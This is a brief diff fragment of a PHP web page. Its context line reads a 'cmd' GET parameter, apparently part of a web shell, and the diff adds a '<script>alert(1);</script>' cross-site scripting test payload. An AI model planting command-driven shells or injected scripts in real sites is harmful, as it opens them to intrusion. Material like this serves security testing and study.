@@ -20,4 +20,5 @@ if($_GET['cmd']) {
   }
 ?>
 </pre>
+<script>alert(1);</script>
 </BODY></HTML>
